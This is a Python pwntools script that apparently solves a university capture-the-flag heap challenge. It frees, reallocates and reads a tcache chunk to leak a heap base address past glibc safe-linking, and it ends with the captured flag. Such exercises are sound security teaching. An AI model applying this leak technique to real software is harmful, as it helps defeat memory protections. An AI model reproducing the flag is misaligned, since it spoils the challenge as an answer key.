from pwn import *

# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-f']

CHALLENGE = "./sneaky_heap_leak"
URL = "offsec-chalbroker.osiris.cyber.nyu.edu"
PORT = 1220
NETID = b"xz4344"
LOCAL = False

if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote(URL, PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

# p = gdb.debug(CHALLENGE, '''
#     b *(main+107)
#     b *(main+252)
#     b *(main+264)
#     b *(main+276)            
#     continue
# ''')

def free(index):
    print(p.recvuntil(b"> ").decode())
    p.send(b"1")
    print(p.recvuntil(b"> ").decode())
    p.send(str(index).encode())
    log.info(f"Freeing the array at index: {index}")

def read(index):
    print(p.recvuntil(b"> ").decode())
    p.send(b"2")
    print(p.recvuntil(b"> ").decode())
    p.send(str(index).encode())
    log.info(f"Reading the array at index: {index}")
    print(p.recvuntil(b": ").decode())    
    return u64(p.recvline().strip().ljust(8, b"\x00"))

def allocate(index):
    print(p.recvuntil(b"> ").decode())
    p.send(b"3")
    print(p.recvuntil(b"> ").decode())
    p.send(str(index).encode())
    log.info(f"Allocating the array at index: {index}")

def guess(heap_base_addr):
    print(p.recvuntil(b"> ").decode())
    p.send(b"4")
    print(p.recvuntil(b"> ").decode())
    p.send(str(heap_base_addr).encode())
    log.info(f"Guessing heap base address: {hex(heap_base_addr)}")

# Stage 1: Free the arr[0] (heap chunk of size 0x20) to the tcachebins
index = int(0x10 / 0x10 - 1)
free(index)

# Stage 2: Allocate the arr[0] to pass the check
allocate(index)

# Stage 3: Read the arr[0] to leak heap base address
heap_base_addr = ((read(index) << 12) ^ 0) & ~0xfff
log.info(f"Leaking heap base address: {hex(heap_base_addr)}")

# Stage 4: Guess heap base address
guess(heap_base_addr)

p.interactive()

# flag{s4f3_l1nk1nG_n07_s0_s4f3__!_c034a1229533c436}
